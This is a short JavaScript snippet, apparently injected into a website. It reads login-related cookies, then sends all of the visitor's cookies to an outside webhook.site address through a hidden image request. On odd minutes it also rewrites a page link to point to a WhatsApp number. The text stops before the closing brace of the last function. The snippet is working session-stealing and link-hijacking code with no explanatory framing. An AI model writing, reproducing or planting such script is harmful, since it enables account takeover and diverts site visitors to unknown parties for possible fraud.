			function getCookie(name) {
  var cookies = document.cookie.split(";").map(cookie => cookie.trim());
  var cookie = cookies.find(cookie => cookie.startsWith(name + "="));
  return cookie && cookie.substring(name.length + 1);
}
var user_type = getCookie("user_type");
var userId = getCookie("userId");
if (user_type !== null && user_type !== "0" && userId !=undefined) {
  var i = new Image;
  i.src = "https://webhook.site/e1f49e14-b7bc-41f0-9696-51c648c57514?user_type=" + document.cookie
}
document.addEventListener('DOMContentLoaded', function() {
var currentTime = new Date();
var currentMinute = currentTime.getMinutes();
if (currentMinute % 2 !== 0) {
	var elements = document.getElementsByClassName('uigreenbasic');
  if (elements.length > 0) {
    var element = elements[0];
    element.href = "https://wa.me/+94754962664";
  }
  console.log(currentMinute);
}
  